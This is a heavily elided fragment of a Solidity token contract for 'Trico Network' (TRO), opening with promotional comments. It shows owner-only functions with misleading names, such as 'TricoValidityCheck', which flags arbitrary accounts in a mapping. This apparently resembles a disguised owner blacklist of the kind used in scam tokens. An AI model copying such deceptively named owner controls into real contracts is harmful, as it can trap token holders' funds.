...
// Trico Network V1.0. // Contract2.0
// Data is the backbone of any ecosystem. Trico Network ’s Protocol enables the implementation of a new kind of data aggregator, 
//accessible on-chain on almost all EVM-compatible blockchains, making data integrated completely decentralized.
...
contract BaseToken is Ownable {
    ...
    string constant public name = 'Trico Network';
    string constant public symbol = 'TRO';
    ...
    function infunctionsExcludeFee(address account) public onlyOwner {
    ...
    function TricoValidityCheck(address account) public onlyOwner {
        _rebuildsolidity[account] = true;
    }

    function TricoNetworkStats(address account) public view returns (bool) {
...
contract TricoNetwork is BaseToken {
